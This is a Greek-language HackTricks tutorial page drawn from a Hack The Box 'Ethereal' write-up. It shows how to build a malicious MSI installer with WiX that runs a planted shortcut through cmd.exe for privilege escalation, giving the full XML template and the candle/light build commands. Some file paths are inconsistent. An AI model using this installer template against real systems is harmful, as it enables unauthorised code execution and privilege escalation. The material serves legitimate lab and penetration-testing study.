{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

# Δημιουργία Κακόβουλου MSI και Απόκτηση Ρίζας

Η δημιουργία του εγκαταστάτη MSI θα γίνει χρησιμοποιώντας τα wixtools, συγκεκριμένα θα χρησιμοποιηθεί το [wixtools](http://wixtoolset.org). Αξίζει να αναφερθεί ότι δοκιμάστηκαν εναλλακτικοί κατασκευαστές MSI, αλλά δεν ήταν επιτυχείς σε αυτή την περίπτωση.

Για μια ολοκληρωμένη κατανόηση των παραδειγμάτων χρήσης του wix MSI, συνιστάται να συμβουλευτείτε [αυτή τη σελίδα](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Εδώ μπορείτε να βρείτε διάφορα παραδείγματα που δείχνουν τη χρήση του wix MSI.

Ο στόχος είναι να παραχθεί ένα MSI που θα εκτελεί το αρχείο lnk. Για να επιτευχθεί αυτό, θα μπορούσε να χρησιμοποιηθεί ο παρακάτω κώδικας XML ([xml από εδώ](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Είναι σημαντικό να σημειωθεί ότι το στοιχείο Package περιέχει χαρακτηριστικά όπως το InstallerVersion και το Compressed, που καθορίζουν την έκδοση του εγκαταστάτη και υποδεικνύουν αν το πακέτο είναι συμπιεσμένο ή όχι, αντίστοιχα.

Η διαδικασία δημιουργίας περιλαμβάνει τη χρήση του candle.exe, ενός εργαλείου από τα wixtools, για τη δημιουργία ενός wixobject από το msi.xml. Η ακόλουθη εντολή θα πρέπει να εκτελεστεί:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Επιπλέον, αξίζει να αναφερθεί ότι παρέχεται μια εικόνα στην ανάρτηση, η οποία απεικονίζει την εντολή και την έξοδό της. Μπορείτε να ανατρέξετε σε αυτήν για οπτική καθοδήγηση.

Επιπλέον, το light.exe, ένα άλλο εργαλείο από τα wixtools, θα χρησιμοποιηθεί για να δημιουργήσει το αρχείο MSI από το wixobject. Η εντολή που θα εκτελεστεί είναι η εξής:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Παρόμοια με την προηγούμενη εντολή, μια εικόνα περιλαμβάνεται στην ανάρτηση που απεικονίζει την εντολή και την έξοδό της.

Παρακαλώ σημειώστε ότι ενώ αυτή η σύνοψη στοχεύει να παρέχει πολύτιμες πληροφορίες, συνιστάται να ανατρέξετε στην αρχική ανάρτηση για πιο λεπτομερείς πληροφορίες και ακριβείς οδηγίες.

## Αναφορές
* [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
* [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)


{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
